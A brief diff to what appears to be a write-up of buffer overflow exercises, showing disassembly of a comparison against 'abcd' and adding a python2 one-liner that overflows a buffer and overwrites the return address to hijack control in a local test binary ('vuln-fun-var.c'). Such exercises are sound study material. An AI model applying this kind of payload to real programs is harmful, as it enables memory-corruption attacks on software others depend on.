@@ -66,3 +66,9 @@ because :
  804851f:       3d 64 63 62 61          cmp    $0x61626364,%eax
  8048524:       75 12                   jne    8048538 <main+0x66>
 ```
+
+For vuln-fun-var.c
+
+```
+python2 -c 'import struct; print "a"*32+struct.pack("iiii",0x080484f2,0,3,2)' | ./a.out
+```
